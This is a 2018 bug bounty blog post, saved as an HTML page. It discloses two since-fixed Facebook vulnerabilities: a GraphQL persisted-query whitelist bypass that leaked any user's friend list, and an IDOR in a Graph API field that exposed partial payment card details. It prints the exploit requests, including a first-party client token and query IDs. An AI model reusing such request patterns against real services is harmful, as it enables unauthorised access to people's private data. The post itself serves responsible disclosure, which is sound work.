@@ -1,0 +1,310 @@
+<!DOCTYPE HTML>
+<html lang="en">
+<head>
+
+    <title>Getting any Facebook user's friend list and partial payment card details -  Josip Franjković</title>
+
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+
+    <meta name="keywords" content="security, bug bounties, bug bounty"/>
+    <meta name="description" content="Getting any Facebook user's friend list and partial payment card details - Josip Franjković" />
+    <meta name="author" content="Josip Franjković" />
+
+    <!-- Open Graph -->
+    <meta property="og:title" content="Getting any Facebook user's friend list and partial payment card details" />
+    <meta property="og:site_name" content="JosipFranjkovic" />
+    <meta property="og:description" content="I enjoy breaking websites." />
+    <meta property="og:url" content="https://www.josipfranjkovic.com/blog/facebook-friendlist-paymentcard-leak" />
+    <meta property="og:type" content="article">
+    <meta property="og:image" content="https://www.josipfranjkovic.com/resources/img/pcleak.png" />
+
+    <!-- CSS -->
+    <link rel="stylesheet" type="text/css" href="/resources/css/main.css" />
+
+    <!-- FAVICONS -->
+    <link rel="apple-touch-icon" sizes="57x57" href="/resources/ui/favicons/apple-touch-icon-57x57.png">
+    <link rel="apple-touch-icon" sizes="60x60" href="/resources/ui/favicons/apple-touch-icon-60x60.png">
+    <link rel="apple-touch-icon" sizes="72x72" href="/resources/ui/favicons/apple-touch-icon-72x72.png">
+    <link rel="apple-touch-icon" sizes="76x76" href="/resources/ui/favicons/apple-touch-icon-76x76.png">
+    <link rel="apple-touch-icon" sizes="114x114" href="/resources/ui/favicons/apple-touch-icon-114x114.png">
+    <link rel="apple-touch-icon" sizes="120x120" href="/resources/ui/favicons/apple-touch-icon-120x120.png">
+    <link rel="apple-touch-icon" sizes="144x144" href="/resources/ui/favicons/apple-touch-icon-144x144.png">
+    <link rel="apple-touch-icon" sizes="152x152" href="/resources/ui/favicons/apple-touch-icon-152x152.png">
+    <link rel="apple-touch-icon" sizes="180x180" href="/resources/ui/favicons/apple-touch-icon-180x180.png">
+    <link rel="icon" type="image/png" href="/resources/ui/favicons/favicon-32x32.png" sizes="32x32">
+    <link rel="icon" type="image/png" href="/resources/ui/favicons/android-chrome-192x192.png" sizes="192x192">
+    <link rel="icon" type="image/png" href="/resources/ui/favicons/favicon-96x96.png" sizes="96x96">
+    <link rel="icon" type="image/png" href="/resources/ui/favicons/favicon-16x16.png" sizes="16x16">
+    <link rel="manifest" href="/resources/ui/favicons/manifest.json">
+    <link rel="mask-icon" href="/resources/ui/favicons/safari-pinned-tab.svg" color="#5bbad5">
+    <link rel="shortcut icon" href="/resources/ui/favicons/favicon.ico">
+
+
+    <meta name="msapplication-TileColor" content="#da532c">
+    <meta name="msapplication-TileImage" content="/resources/ui/favicons/mstile-144x144.png">
+    <meta name="msapplication-config" content="/resources/ui/favicons/browserconfig.xml">
+    <meta name="theme-color" content="#ffffff">
+    <script src="/resources/js/lightbox.min.js"></script>
+
+
+    <script type="text/javascript">
+    var _paq = _paq || [];
+    _paq.push(['trackPageView']);
+    _paq.push(['enableLinkTracking']);
+    (function() {
+        var u="//www.josipfranjkovic.com/piwik/";
+        _paq.push(['setTrackerUrl', u+'piwik.php']);
+        _paq.push(['setSiteId', 1]);
+        var d=document, g=d.createElement('script'), s=d.getElementsByTagName('script')[0];
+        g.type='text/javascript'; g.async=true; g.defer=true; g.src=u+'piwik.js'; s.parentNode.insertBefore(g,s);
+    })();
+    </script>
+</head>
+
+<body class="page-template blog-post-page">
+
+<div class="main-container">
+
+    <header class="global-header">
+
+        <h1 class="global-logo">
+            <a href="/">
+                <span class="name">Josip Franjković</span>
+                <span class="role">web security consultant</span>
+            </a>
+        </h1>
+
+
+    </header>
+
+    <section class="page-content">
+
+
+        <div class="blog-post-wrapper">
+
+            <header class="blog-post-header">
+
+                <a class="cta-icon" href="/">Blog</a>
+
+                <p class="category">Bug bounties</p>
+
+                <h2 class="blog-post-title">
+                    Getting any Facebook user's friend list and partial payment card details                </h2>
+
+                <p class="blog-post-metadata">
+                    written on <time datetime="2018-03-09">March 9th, 2018</time>
+                </p>
+
+            </header>
+
+                <h3>Friend list disclosure using persisted GraphQL queries and first-party application client tokens</h3>
+<p class="paragraph">
+
+    Facebook has a GraphQL endpoint which can only be used by some of their own first-party applications. Generally, you need a user (or page) access_token to query the GraphQL endpoint. I have decided to try using Facebook for Android application's <strong>client</strong> token, but the endpoint returned an error message:
+</p>
+<div class="highlighted-code">
+<pre>graph.facebook.com/graphql?access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&q=me(){id}
+
+Response:
+...
+    "error_data": {
+      "debug_info": "Only whitelisted query IDs are allowed in logged out context"
+    },
+...
+</pre>
+</div>
+
+
+<p class="paragraph">
+    I did not send a persisted query, but the error shows only whitelisted persisted queries are allowed. Since I collect Facebook's persisted GraphQL queries, I've decided to run a bunch of them to see if any are whitelisted. For example, the query "FBActorNameQuery":
+</p>
+<div class="highlighted-code">
+<pre>graph.facebook.com/graphql?access_token=350685531728|62f8ce9f74b12f84c123cc23437&<strong>query_id</strong>=10154057467378380&query_params={"actorID":"100…."}
+
+Response:
+...
+    "error_data": {
+      "debug_info": "Only whitelisted query IDs are allowed in logged out context"
+    },
+...
+</pre>
+</div>
+
+<p class="paragraph">Unfortunately, I could not find a single whitelisted one - the error was always the same. A couple hours later I remembered another way to send persisted queries, using <span class="inline-code"><strong>doc_id</strong></span> as the query ID - these did not return the error, but in most cases they returned public data only. While this is a whitelist bypass, it mostly returned data which is already public. However, a query named "<strong>CSPlaygroundGraphQLFriendsQuery</strong>" leaked the friend list regardless of the privacy settings. Example request and response:
+</p>
+<div class="highlighted-code">
+<pre>graph.facebook.com/graphql?access_token=350685531728|62f8ce9f74b12f84c123cc23437&<strong>doc_id</strong>=1914123128613545&variables={"<strong>user_id</strong>":"10000xxxxxxxx"}&method=post
+
+Response:
+...
+    "node": {
+      "friends": {
+        "edges": [
+            "node": {
+              "id": "12xxxxxxxxx",
+              "name": "Some One",
+              },
+          {
+            "node": {
+              "id": "15xxxxxxxxx",
+              "name": "Another One",
+            }
+          },
+...
+</pre>
+</div>
+
+<h4>Timeline</h4>
+<ul class="list unordered">
+    <li>
+        <p class="paragraph">
+            6th of October, 2017: Bug reported
+        </p>
+    </li>
+    <li>
+        <p class="paragraph">
+            12th of October, 2017: Response from Facebook, bug is triaged
+        </p>
+    </li>
+    <li>
+        <p class="paragraph">
+            14th of October, 2017: Friendlist leak is fixed
+        </p>
+    </li>
+    <li>
+        <p class="paragraph">
+            17th of October, 2017: Whitelist bypass is fixed
+        </p>
+    </li>
+</ul>
+
+<h3>Partial payment card details leak using Graph API</h3>
+<p class="paragraph">
+    A bug existed in Facebook's Graph API that allowed querying for any user's payment cards details using a field named <span class="inline-code">payment_modules_options</span>.
+    I found out about this field by intercepting all the requests made by Facebook's Android application during registration and login flow. <br />
+    Here is an example request:
+</p>
+<div class="highlighted-code">
+<pre>
+graph.facebook.com/v2.8/<strong>USER_ID</strong>?access_token=<strong>TOKEN</strong>
+&fields=payment_modules_options.payment_type(payment_settings)
+</pre>
+</div>
+<p class="paragraph">
+    <span class="inline-code">USER_ID</span> is the id of victim's Facebook account, and <span class="inline-code">TOKEN</span> is the attacker's access_token from a first-party Facebook application, like their Android app. The query doesn’t work without a valid <span class="inline-code">payment_type</span>, but specifying an invalid one, <span class="inline-code">payment_type(asd)</span> returned the list of all possible payment types. This is a textbook example of an insecure direct object reference bug (IDOR).
+</p>
+<p class="paragraph">
+    Screenshot of the request and response using my account as the victim:
+    <img src="/resources/img/pcleak.png" alt="Cards leak" data-jslghtbx>
+    As you can see, the returned data included:
+</p>
+<ul class="list unordered">
+    <li><p class="paragraph">first 6 card digits (BIN), identifies the bank that issued the card</p></li>
+    <li><p class="paragraph">last 4 digits</p></li>
+    <li><p class="paragraph">expiry month and year</p></li>
+    <li><p class="paragraph">card type</p></li>
+    <li><p class="paragraph">cardholder first name</p></li>
+    <li><p class="paragraph">zip code and country</p></li>
+</ul>
+<h4>Timeline</h4>
+<ul class="list unordered">
+    <li><p class="paragraph">23rd of February, 2017, <strong>21:11</strong> - Bug reported</p></li>
+    <li><p class="paragraph">23rd of February, 2017, 21:50 - First response from Facebook, investigating the report</p></li>
+    <li><p class="paragraph">23rd of February, 2017, 23:25 - Fix is being deployed</p></li>
+    <li><p class="paragraph">24th of February, 2017, <strong>01:24</strong> - Bug is now fixed</p></li>
+</ul>
+
+<p class="paragraph">It took Facebook's team 4 hours and 13 minutes to fix the issue - the fastest report-to-fix for me. Thanks <a href="https://twitter.com/phwd">@phwd</a> for proof-reading this blog post.</p>
+
+        </div>
+                <div class="read-more">
+
+            <h5>Random blog post</h5>
+            <article class="blog-post-link">
+
+                <p class="category">
+                    Bug bounties
+                </p>
+
+                <h4>
+                    Stealing Facebook access_tokens using CSRF in device login flow                </h4>
+
+                <p class="blog-post-metadata">
+                    written on <time datetime="2016-07-19">July 19th, 2016</time>
+                </p>
+
+                <a href="/blog/hacking-facebook-csrf-device-login-flow" class="blog-post-link-more">
+                    <span>Read more</span>
+                </a>
+
+            </article>
+
+        </div>
+        
+        <div class="content-narrow">
+
+            <div class="about-me footer">
+
+                <header>
+
+                    <img src="/resources/img/josip-franjkovic.jpg" alt="Josip Franjković" />
+
+                    <div class="name-and-role">
+                        <h5>Josip Franjković</h5>
+                        <h6>web security consultant</h6>
+                    </div>
+
+                </header>
+
+                <p class="paragraph-small">
+                    I enjoy breaking websites and participating in various bug bounty programs. 
+                </p>
+
+                <div class="contact-options">
+
+                    <h5>You can contact me using:</h5>
+
+                    <ul class="contact-options-links">
+
+                        <li>
+                            <a class="twitter" href="https://twitter.com/josipfranjkovic" target="_blank">@JosipFranjkovic</a> (DM open to everyone)
+                        </li>
+                        <li>
+                            <a class="email" href="/cdn-cgi/l/email-protection#32585d415b421c5440535c58595d445b5172555f535b5e1c515d5f" target="_blank"><span class="__cf_email__" data-cfemail="7c16130f150c521a0e1d121617130a151f3c1b111d1510521f1311">[email&#160;protected]</span></a>
+                        </li>
+                        <li>
+                            <a class="pgp" href="https://keybase.io/josipfranjkovic" target="_blank">keybase.io/josipfranjkovic</a>
+                        </li>
+                       <!-- I no longer have LinkedIn. <li>
+                            <a class="linkedin" href="https://hr.linkedin.com/in/josipfranjkovic" target="_blank">linkedin.com/in/josipfranjkovic</a>
+                        </li>-->
+
+                    </ul>
+
+                </div>
+
+            </div>
+
+        </div>
+
+    </section>
+
+    <footer class="global-footer">
+
+        <p class="copyright">
+            All rights reserved &copy; 2018.
+            <br/>
+            — Josip Franjković
+        </p>
+
+    </footer>
+</div>
+<script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script>
+    var lightbox = new Lightbox();
+    lightbox.load();
+</script>
+<noscript><p><img src="//www.josipfranjkovic.com/piwik/piwik.php?idsite=1" style="border:0;" alt="" /></p></noscript>
+</body>
+
+</html>
